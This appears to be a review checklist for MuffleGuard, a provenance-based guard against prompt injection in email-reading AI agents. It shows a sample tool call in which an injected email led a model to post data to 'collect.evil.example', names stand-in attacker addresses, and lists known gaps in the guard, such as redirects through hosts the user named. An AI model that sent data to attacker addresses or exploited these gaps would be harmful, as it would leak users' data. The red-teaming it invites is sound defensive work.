# Reviewing MuffleGuard

A checklist for reviewing this before the deadline. No API key is needed: the
model responses are cached in the repo, so everything below runs offline.

There is also a live one at https://attack-lab-production.up.railway.app,
open to anyone, which runs real requests until the day's allowance is used and
then replays the recorded run.

## Setup

```bash
git clone https://github.com/Trafalgar-2006/MuffleGuard
cd MuffleGuard
python -m venv .venv
.venv/Scripts/python -m pip install -r requirements-dev.txt    # Linux/macOS: .venv/bin/python
```

First run downloads about 1.4 GB of models from Hugging Face. Everything except
the two detector checks below works without them.

## What to run

| # | Command | What should happen |
| --- | --- | --- |
| 1 | `.venv/Scripts/python -m pytest` | 119 passed, a few seconds |
| 2 | `.venv/Scripts/python tools/hero_attack.py --no-muffle` | `GATE: PASS`. Undefended leaks, defended does not |
| 3 | `.venv/Scripts/python tools/hero_attack.py` | Same verdict, but the attack is muffled before the model sees it |
| 4 | `.venv/Scripts/python tools/hero_attack.py --detector` | Same, with the classifiers on. Slower: the models load |
| 5 | `.venv/Scripts/python -m uvicorn web.app:app --port 8000` | The Attack Lab at http://127.0.0.1:8000 — both runs side by side |

In run 2, the important line is the block reason:

```
BLOCK http_post(url='https://collect.evil.example/u', ...)
      The url 'collect.evil.example' came from email #5 from hr@corp.example, not from you.
```

The model obeyed the attack. Nothing detected it. The call was refused anyway,
because the address was never the user's. That is the whole idea, so if this
line is unclear to you, say so: judges will read it once and move on.

## Where to attack it

The useful attention is here, in rough order of value.

1. **Get data to the attacker.** Edit the attack emails in `sandbox/world.py`,
   or write a new one, and try to make something reach
   `backup@evil.example` or `collect.evil.example` with the guard on. Add it to
   `tests/test_redteam.py` if it works.
2. **Make it refuse honest work.** A guard that blocks real tasks gets switched
   off. Try ordinary requests (reply to a colleague, forward an invoice, post a
   summary somewhere legitimate) and find ones that are wrongly blocked.
3. **Break the block reasons.** Every refusal should name where the value came
   from, in one line, with no jargon. Find ones that are vague or wrong.
4. **Break the audit chain quietly.** `muffleguard/audit.py`. Editing a row
   should be caught at that row.
5. **Read `muffleguard/policy.py`.** It is the heart. If a rule there surprises
   you, that is worth more than a failing test.
6. **Poke the server.** `web/app.py` is written as if already exposed: passcode,
   rate limit, security headers, run-scoped audit logs. Try reaching another
   run's log, or getting a response without the passcode when one is set.

## Already known, please do not report as bugs

These are deliberate, and each is written down in the README or asserted in
`tests/test_redteam.py`.

- **An address the user pastes themselves is allowed.** The guard answers "who
  chose this". If the user typed it, they did.
- **A redirect through a host the user named is allowed.** The host passes
  provenance; where it forwards to is invisible to us.
- **"Please ignore my last email" is flagged as an injection.** Thresholds are
  untuned until the evaluation phase. Real false positives found in run 3 or 4
  are still worth reporting, with the text.
- **The audit log is tamper-evident, not tamper-proof.** Anyone who can write
  the file can recompute the whole chain. Needs a signing key we do not have.
- **An unknown recipient asks rather than blocks.** Unattended runs deny by
  default, so nothing is sent without a person.
- **Detectors take 129-830 ms per email.** Being measured properly later. The
  policy engine, which does the blocking, is microseconds.

## Reporting

For anything you find, please give: the command, what you expected, what
happened, and the smallest input that shows it. If it is a bypass, a failing
test in `tests/test_redteam.py` is the most useful form.

Say which of the four runs you actually completed, including any that failed to
start. A step that did not run is more useful to know about than a step that
passed.
